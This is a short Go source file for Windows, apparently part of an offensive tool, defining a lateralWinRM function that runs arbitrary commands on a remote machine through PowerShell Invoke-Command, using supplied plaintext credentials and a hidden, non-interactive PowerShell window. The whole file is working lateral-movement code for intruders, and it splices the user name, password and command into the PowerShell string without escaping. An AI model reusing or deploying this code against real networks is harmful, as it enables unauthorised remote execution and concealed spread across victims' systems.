//go:build windows
// +build windows

package main

import (
	"fmt"
	"os/exec"
)

func lateralWinRM(target, user, pass, cmd string) (string, error) {
	if cmd == "" {
		cmd = "whoami"
	}
	ps := ""
	if user != "" && pass != "" {
		ps = fmt.Sprintf(`$s=New-Object System.Management.Automation.PSCredential('%s',(ConvertTo-SecureString '%s' -AsPlainText -Force)); Invoke-Command -ComputerName %s -Credential $s -ScriptBlock { cmd /c "%s" }`, user, pass, target, cmd)
	} else {
		ps = fmt.Sprintf(`Invoke-Command -ComputerName %s -ScriptBlock { cmd /c "%s" }`, target, cmd)
	}
	c := exec.Command("powershell", "-NoP", "-NonI", "-Command", ps)
	applyHideWindow(c)
	out, err := c.CombinedOutput()
	return string(out), err
}
